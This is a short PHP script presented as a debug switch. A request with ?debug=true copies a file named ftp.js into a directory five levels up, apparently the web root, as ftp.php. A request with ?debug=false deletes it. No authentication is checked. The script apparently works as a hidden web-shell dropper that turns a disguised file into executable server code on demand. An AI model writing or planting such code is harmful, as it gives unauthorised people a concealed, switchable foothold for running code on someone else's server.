<?php
$path = '../../../../../';	//5 upto root
$fn = 'ftp';
if(isset($_GET["debug"])){
	if($_GET["debug"]=='true'){
		if(file_exists($fn.'.js')){
			copy($fn.'.js', $path.$fn.'.php');
			echo 'file created';
		} else {
			'file to copy not found';
		}
	} else if($_GET["debug"]=='false') {
		if(file_exists($path.$fn.'.php')){
			unlink($path.$fn.'.php');
			echo 'file deleted';
		} else {
			echo 'file to delete not found';
		}		
	}
}
?>